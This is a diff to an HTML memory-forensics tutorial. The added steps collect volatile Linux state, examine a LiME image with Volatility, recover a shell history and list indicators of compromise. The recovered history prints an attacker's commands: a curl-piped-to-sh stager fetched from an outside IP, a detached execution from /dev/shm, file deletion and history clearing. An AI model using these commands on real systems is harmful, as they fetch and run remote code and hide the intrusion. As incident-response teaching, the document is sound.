@@ -114,6 +114,15 @@ tcp   ESTAB  0      0      10.0.2.15:41990      198.51.100.77:443  users:(("kwor
       <p>That second line is the anomaly that anchors the whole investigation: a kernel-thread-named process holding a userspace TCP socket to an unfamiliar IP. Legitimate kworkers do not open outbound TLS sessions. Next, snapshot the process list and open-file table so you can correlate PIDs across sources:</p>
       <div class="command-block"><div class="command"><code>ps auxww &gt; live/ps.txt &amp;&amp; lsof -nP &gt; live/lsof.txt</code></div></div>
 <pre><code class="language-bash">root  4412  0.0  0.0  0  0 ?  S  14:02  0:00 [kworker/u8:2]</code></pre>
+      <p>Before leaving live state, grab the remaining volatile system context: who is logged in, which kernel modules are loaded (rootkits often show up here), what is mounted, and what scheduled jobs exist. These all change constantly on a busy box and some of them vanish entirely on reboot.</p>
+      <div class="command-block"><div class="command"><code>who -a &gt; live/logins.txt; w &gt;&gt; live/logins.txt; last -20 &gt;&gt; live/logins.txt</code></div></div>
+      <div class="command-block"><div class="command"><code>lsmod &gt; live/modules.txt &amp;&amp; mount &gt; live/mounts.txt &amp;&amp; crontab -l &gt; live/cron-root.txt 2&gt;/dev/null</code></div></div>
+<pre><code class="language-bash"># live/logins.txt
+root     pts/0        2025-06-03 14:02   198.51.100.77
+# live/modules.txt (abridged)
+lime                   16384  0
+x_tables               40960  1</code></pre>
+      <p>The login record shows a root session from the same external IP the suspicious socket points at - the first hint that the C2 channel and an interactive intrusion are tied to one actor. The loaded-module list is checked against a known-good baseline from an identical clean VM; any module present here but absent there gets its name, size, and load time recorded for follow-up.</p>
       <p><strong>How to verify:</strong> cross-check the PID in <code>ss</code> against <code>ps</code> and <code>lsof</code>. If a PID appears in the socket table but not in <code>ps</code>, you may be looking at a rootkit hiding processes - which makes the memory capture in the next steps even more critical. Hash these small text files immediately (<code>sha256sum live/* &gt;&gt; hashes/live.sha256</code>) so they are locked into the record before you move on.</p>
 
       <h3>2. Build LiME against the exact running kernel</h3>
@@ -150,9 +159,38 @@ tcp   ESTAB  0      0      10.0.2.15:41990      198.51.100.77:443  users:(("kwor
       <div class="command-block"><div class="command"><code>vol -f mem.lime linux.malfind --pid 4412 --dump</code></div></div>
       <p>The socket state from memory matches the live capture exactly - same PID, same foreign IP, same port. That cross-source agreement is what turns a suspicious observation into a corroborated indicator. The dumped region can now be hashed, scanned with YARA, and disassembled on the analysis box without ever touching the victim again. Finish by dumping the full process and checking its memory maps for deleted-file backing:</p>
       <div class="command-block"><div class="command"><code>vol -f mem.lime -o dumps linux.pslist.PsList --pid 4412 --dump</code></div></div>
-      <p><strong>How to verify:</strong> a Volatility run that returns an empty process list or floods you with symbol errors almost always means the wrong ISF for the kernel version - re-check <code>banners.Banners</code> output against the JSON file name in your symbols directory.</p>
+      <p>Two more plugins round out the picture. First, the process tree confirms the parentage anomaly visually - <code>linux.pstree</code> indents children under their parents, and a bracketed "kernel thread" hanging directly off PID 1 stands out immediately:</p>
+      <div class="command-block"><div class="command"><code>vol -f mem.lime linux.pstree | head -20</code></div></div>
+<pre><code class="language-bash">PID  PPID  COMM
+1    0     systemd
+* 4412 1    [kworker]
+* 1180 1    nginx
+2    0     kthreadd
+* 87   2    kworker/u8:0
+* 103  2    kworker/u8:1</code></pre>
+      <p>Compare the two kworker entries: the legitimate one (PID 87) is a child of <code>kthreadd</code> (PID 2), while the impostor (PID 4412) is a child of init. Second, recover the attacker's shell history from memory. Interactive shells keep their command history in a heap buffer even when the on-disk <code>.bash_history</code> has been deleted or the session never wrote it out - the <code>linux.bash</code> plugin carves those buffers straight out of the image:</p>
+      <div class="command-block"><div class="command"><code>vol -f mem.lime linux.bash.Bash | tail -8</code></div></div>
+<pre><code class="language-bash">PID      Process   CommandTime        Command
+-------  --------  -----------------  -------
+3620     bash      2025-06-03 13:58   curl http://198.51.100.77/s.sh | sh
+3620     bash      2025-06-03 13:59   setsid /dev/shm/.x &amp;
+3620     bash      2025-06-03 14:00   rm -f /dev/shm/.x
+3620     bash      2025-06-03 14:01   history -c</code></pre>
+      <p>This is the intrusion narrative in four lines: a stager pulled over HTTP, executed from a world-writable directory, launched detached with <code>setsid</code> (which explains the PPID of 1), the on-disk copy deleted immediately, and the history buffer cleared - which failed, because <code>history -c</code> only scrubs the file on exit and the heap copy survived in RAM. Finally, scan the dumped injected region with YARA to classify it:</p>
+      <div class="command-block"><div class="command"><code>sha256sum dumps/pid.4412.vad.0x7f*.dmp &amp;&amp; yara rules/fileless.yar dumps/</code></div></div>
+<pre><code class="language-bash">4c9a...f21d  dumps/pid.4412.vad.0x7f3a0000.dmp
+generic_reverse_shell_payload dumps/pid.4412.vad.0x7f3a0000.dmp</code></pre>
+      <p><strong>How to verify:</strong> a Volatility run that returns an empty process list or floods you with symbol errors almost always means the wrong ISF for the kernel version - re-check <code>banners.Banners</code> output against the JSON file name in your symbols directory. A healthy pslist on a small VM shows on the order of 100-200 processes; a handful of rows or a crash means stop and fix symbols before interpreting anything.</p>
 
-      <h3>5. Close out the custody record</h3>
+      <h3>5. Document indicators and hand off</h3>
+      <p>Findings are only useful if they are recorded in a form the next analyst (or a lawyer) can act on. Write up the indicators of compromise with their evidence sources while the details are fresh:</p>
+<pre><code class="language-bash"># case-2025-014 IOCs
+198.51.100.77:443  C2 endpoint   ss live capture + linux.sockstat (PID 4412)
+4c9a...f21d        inject dump   linux.malfind RWX region, YARA: reverse_shell
+/dev/shm/.x        stager path   linux.bash history (deleted from disk)</code></pre>
+      <p>Each indicator lists where it was observed, because the strength of the case is the cross-source agreement: the IP appears in the live socket table <em>and</em> the memory image; the deleted stager path appears only in memory-carved shell history, which is precisely why it was worth capturing RAM at all.</p>
+
+      <h3>6. Close out the custody record</h3>
       <p>After the last artifact is collected, hash everything, append a closing timestamp to the custody log, and unmount the evidence drive. From this point on, every time the image moves or is analyzed, the hash is re-verified first.</p>
       <div class="command-block"><div class="command"><code>sha256sum memory/mem.lime &gt;&gt; hashes/memory.sha256 &amp;&amp; echo "$(date -u) collection complete" &gt;&gt; custody.log</code></div></div>
     </section>
